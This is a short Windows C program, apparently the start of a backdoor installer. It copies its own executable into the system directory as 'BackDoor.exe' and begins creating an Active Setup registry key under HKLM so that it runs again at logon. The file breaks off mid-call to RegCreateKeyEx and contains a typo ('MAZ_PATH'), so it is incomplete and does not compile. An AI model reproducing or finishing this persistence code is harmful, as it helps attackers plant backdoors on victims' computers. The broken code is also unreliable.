#include <windows.h>

#define REG_PATH "software\\microsoft\\active setup\\" \
					"Installed Components\\{E0EDB497-B2F5-4b4f-97EC-2362BC4CC50D}"
					
int main()
{
	HKEY hKey;
	
	LONG lRet = RegOpenKeyEx(HKEY_CURRENT_USER,
						REG_PATH,
						REG_OPTION_NON_VOLATILE,
						KEY_ALL_ACCESS,
						&hKey);
	
	if ( lRet != ERROR_SUCCESS )
	{
		char szSelfFile[MAX_PATH] = {0};
		char szSystemPath[MAZ_PATH] = {0};
		
		GetSystemDirectory(szSystemPath, MAX_PATH);
		strcat(szSystemPath, "\\BackDoor.exe");
		
		GetModuleFileName(NULL, szSelfFile, MAX_PATH);
		
		CopyFile(szSelfFile, szSystemPath, FALSE);
		
		lRet = RegCreateKeyEx(HKEY_LOCAL_MACHINE,
							
	}
}